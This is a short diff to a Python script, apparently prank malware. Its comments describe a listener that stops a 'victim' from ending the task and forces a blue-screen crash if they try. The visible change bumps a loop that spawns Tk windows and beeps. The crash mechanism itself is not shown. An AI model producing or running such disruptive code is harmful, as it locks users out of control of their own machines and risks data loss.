@@ -1,6 +1,5 @@
 # this code will add a listener that makes sure the victim(even though this code is harmless) does not attempt to end the tast.
 # if this happens, the code will launch a barrage of errors that will result in a BSOD
-# this will likely be created into a seperate, larger project
 
 import ctypes
 from ctypes import windll
@@ -65,7 +64,7 @@ def throwawayroot():
     
     Tk.update(toplevel)
 
-for i in range(0, 230):
+for i in range(0, 240):
     throwawayroot()
     if i/10 == int(i/10):
         toplevel.bell()
